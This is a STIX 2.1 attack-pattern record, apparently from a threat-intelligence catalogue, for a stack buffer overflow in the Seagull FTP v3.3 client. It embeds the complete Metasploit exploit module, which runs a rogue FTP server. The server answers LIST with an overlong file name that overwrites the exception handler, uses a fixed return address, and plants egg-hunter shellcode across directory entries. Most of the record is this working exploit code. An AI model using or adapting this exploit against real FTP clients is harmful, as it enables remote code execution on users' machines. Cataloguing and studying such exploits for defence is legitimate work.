{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--300661ca-62c7-4a3d-bca0-c0d6edd41b2b",
    "created": "2024-08-14T16:51:01.965563Z",
    "modified": "2024-08-14T16:51:01.965567Z",
    "name": "Seagull FTP v3.3 Build 409 Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the Seagull FTP client that gets triggered when the ftp client processes a response to a LIST command. If the response contains an overly long file/folder name, a buffer overflow occurs overwriting a structured exception handler. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/seagull_list_reply.rb",
            "external_id": "seagull_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::Omelet\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Seagull FTP v3.3 Build 409 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Seagull FTP client that gets\n        triggered when the ftp client processes a response to a LIST command. If the\n        response contains an overly long file/folder name, a buffer overflow occurs,\n        overwriting a structured exception handler.\n      },\n      'Author' \t =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>' # found bug, wrote the exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '94556' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -1500,\n          'DisableNops' => 'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XP Universal', { 'Offset' => 232, 'Ret' => 0x7CE4650C } ], # jmp esp shell32.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n  end\n\n  #---------------------------------------------------------------------------------\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n    print_status(\"Handling LIST command\")\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n    print_status(\" - Data connection set up\")\n    code = 150\n    c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n    code = 226\n    c.put(\"#{code} Directory send ok.\\r\\n\")\n\n    crash = \"A\" * target['Offset']\n    crash << [target.ret].pack('V')\n\n    #corelanc0d3r's omelet mixin\n    thepayload = (\"\\x90\" * 30) + payload.encoded\n\n    omeletoptions =\n    {\n      :eggsize => 123,\n      :eggtag => \"00w\",\n      :searchforward => true,\n      :reset => false,\n      :checksum => true\n    }\n    badchars = '\\x00'\n    omelet =  generate_omelet(thepayload,badchars,omeletoptions)\n\n    omeletcode = omelet[0]\n    print_status(\"[+] Omelet code : #{omeletcode.length} bytes\")\n    print_status(\"[+] Number of eggs : #{omelet[1].length}\")\n    print_status(\"[+] Sending payload\")\n    crash << (\"\\x90\" * 30) + omeletcode\n\n    print_status(\" - Sending directory list via data connection\")\n    dirlist = \"\"\n\n    omelet[1].each do |thischunk|\n      print_status(\" [+] Planted egg of #{thischunk.length} bytes\")\n      dirlist << \"drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{thischunk}\\r\\n\"\n    end\n    dirlist << \"drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{crash}\\r\\n\"\n    conn.put(\"total #{omelet[1].length+1}\\r\\n\"+dirlist)\n    conn.close\n    print_status(\" - Wait for omelet hunter...\")\n    return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}